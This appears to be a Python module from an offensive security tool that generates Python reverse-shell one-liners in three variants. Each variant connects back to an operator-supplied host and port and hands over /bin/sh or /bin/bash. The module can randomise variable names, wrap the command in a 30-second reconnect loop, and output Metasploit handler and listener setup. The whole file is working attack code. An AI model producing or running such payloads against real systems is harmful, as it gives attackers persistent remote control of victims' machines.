import random
from .base import (
    RandomNamePool, ShellGenerator, ShellOptions, ShellResult,
    TTY_UPGRADE, msf_handler, LISTENER_FMT, build_listener_setup,
)

_VARIANTS = ["socket_exec", "socket_subprocess", "pty"]


class PythonGenerator(ShellGenerator):
    language = "python3"

    def _generate(self, opts: ShellOptions, names: RandomNamePool | None) -> ShellResult:
        variant = random.choice(_VARIANTS)

        if variant == "socket_exec":
            cmd = self._socket_exec(opts, names)
        elif variant == "socket_subprocess":
            cmd = self._socket_subprocess(opts, names)
        else:
            cmd = self._pty_variant(opts, names)

        if opts.retry and variant != "pty":
            cmd = f"while :; do {cmd}; sleep 30; done"

        return ShellResult(
            command=cmd,
            variant=variant,
            language=self.language,
            arch=opts.arch,
            listener=LISTENER_FMT.format(lport=opts.lport),
            tty_upgrade=TTY_UPGRADE,
            msf_compat=msf_handler("payload/cmd/unix/reverse_python", opts.lhost, opts.lport),
            listener_setup=build_listener_setup(opts.lhost, opts.lport),
        )

    def _socket_exec(self, opts: ShellOptions, names: RandomNamePool | None) -> str:
        s = self._var("s", names)
        return (
            f'python3 -c \'import socket,subprocess,os;'
            f'{s}=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
            f'{s}.connect(("{opts.lhost}",{opts.lport}));'
            f'os.dup2({s}.fileno(),0);os.dup2({s}.fileno(),1);'
            f'os.dup2({s}.fileno(),2);'
            f'subprocess.call(["/bin/sh","-i"])\''
        )

    def _socket_subprocess(self, opts: ShellOptions, names: RandomNamePool | None) -> str:
        s = self._var("s", names)
        p = self._var("p", names)
        return (
            f'python3 -c \'import socket,subprocess;'
            f'{s}=socket.socket();'
            f'{s}.connect(("{opts.lhost}",{opts.lport}));'
            f'{p}=subprocess.Popen(["/bin/sh"],stdin={s},stdout={s},stderr={s});'
            f'{p}.wait()\''
        )

    def _pty_variant(self, opts: ShellOptions, names: RandomNamePool | None) -> str:
        s = self._var("s", names)
        return (
            f'python3 -c \'import pty,socket,os;'
            f'{s}=socket.socket();'
            f'{s}.connect(("{opts.lhost}",{opts.lport}));'
            f'os.dup2({s}.fileno(),0);os.dup2({s}.fileno(),1);os.dup2({s}.fileno(),2);'
            f'pty.spawn("/bin/bash")\''
        )

